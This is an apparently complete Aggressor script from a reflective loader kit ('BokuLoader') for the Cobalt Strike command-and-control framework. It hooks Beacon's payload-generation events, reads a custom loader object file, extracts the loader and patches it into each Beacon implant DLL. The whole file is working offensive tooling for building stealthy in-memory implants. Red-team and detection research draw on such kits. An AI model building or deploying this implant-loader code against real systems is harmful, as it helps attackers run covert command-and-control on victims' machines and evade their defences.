
# User Defined Reflective Loader Kit Aggressor Script

sub generate_my_dll {

	local('$profile $handle $data $loader $temp_dll $userwx $obfuscate $sleep_mask $stomppe $name');


	$name = "dist/BokuLoader";

	$profile = data_query("metadata")["c2profile"];

	#$userwx     = [$profile getString: ".stage.userwx"];
	#$obfuscate  = [$profile getString: ".stage.obfuscate"];
	#$sleep_mask = [$profile getString: ".stage.sleep_mask"];
	#$stomppe    = [$profile getString: ".stage.stomppe"];


	$name = $name . $3 . ".o";
	warn("loading: " . $name);

	$handle = openf(script_resource($name));
	$data   = readb($handle, -1);
	closef($handle);

	warn("Loaded Length: " . strlen($data));

	if (strlen($data) eq 0) {
		warn("Error loading reflective loader object file.");
		return $null;
	}

	$loader = extract_reflective_loader($data);

	warn("Extracted Length: " . strlen($loader));

	if (strlen($loader) eq 0) {
		warn("Error extracting reflective loader.");
		return $null;
	}

	$temp_dll = setup_reflective_loader($2, $loader);

	return $temp_dll;
}

set BEACON_RDLL_GENERATE {
	warn("========== Running 'BEACON_RDLL_GENERATE' for DLL " . $1 . " with architecture " . $3 . " ==========");
	return generate_my_dll($1, $2, $3);
}

set BEACON_RDLL_GENERATE_LOCAL {
	warn("========== Running 'BEACON_RDLL_GENERATE_LOCAL' for DLL " . $1 . " with architecture " . $3 . " Beacon ID " . $4 . " GetModuleHandleA " . $5 . " GetProcAddress " . $6 . " ==========");
	return generate_my_dll($1, $2, $3);
}

set BEACON_RDLL_SIZE {
	warn("========== Running 'BEACON_RDLL_SIZE' for DLL Name " . $1 . " with architecture " . $2);
	return "100";
}
